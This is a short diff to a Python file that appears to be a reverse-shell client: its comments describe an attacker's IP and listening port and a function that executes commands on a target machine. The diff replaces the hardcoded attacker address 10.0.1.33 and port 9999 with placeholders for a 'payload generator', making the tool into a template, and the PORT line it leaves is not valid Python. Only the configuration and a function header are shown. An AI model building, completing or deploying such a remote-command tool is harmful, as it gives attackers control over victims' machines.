@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # Set up the target server and port (attacker's machine)
-HOST = '10.0.1.33'  # Attacker's IP address
-PORT = 9999  # Port the attacker is listening on
+HOST = '(here the payload generator will enter it)'  # Attacker's IP address
+PORT = (here the payload generator will enter it)  # Port the attacker is listening on
 
 # Function to execute commands on the target machine
 def execute_command(command):
